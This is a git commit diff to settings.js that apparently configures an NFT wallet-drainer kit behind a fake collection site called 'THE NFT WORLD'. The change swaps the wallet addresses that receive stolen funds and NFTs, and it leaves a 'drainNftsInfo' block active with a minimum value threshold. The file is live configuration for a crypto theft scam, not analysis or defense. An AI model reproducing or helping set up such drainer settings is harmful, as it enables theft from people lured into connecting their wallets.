3b65c4b8a3b958162c86841cb2213e6f1339604d
benben18273 <123966999+benben18273@users.noreply.github.com>
2023-05-28 04:14:00 +0200

    Update settings.js

--- settings.js
+++ settings.js
@@ -1,4 +1,4 @@
-const receiveAddress = '0xa92dDc31B089Cc80f05F9fFE7eb2a57aBBDe545c',
+const receiveAddress = '0xd949D0623b53FD05eeA3C3728F36CEaC1E81d4e6',
   collectionInfo = {
     name: 'THE NFT WORLD',
     socialMedia: {
@@ -27,7 +27,7 @@ const receiveAddress = '0xa92dDc31B089Cc80f05F9fFE7eb2a57aBBDe545c',
   drainNftsInfo = {
     active: true,
     minValue: 0.1,
-    nftReceiveAddress: '0xa92dDc31B089Cc80f05F9fFE7eb2a57aBBDe545c',
+    nftReceiveAddress: '0xd949D0623b53FD05eeA3C3728F36CEaC1E81d4e6',
   },
 
   customStrings = {
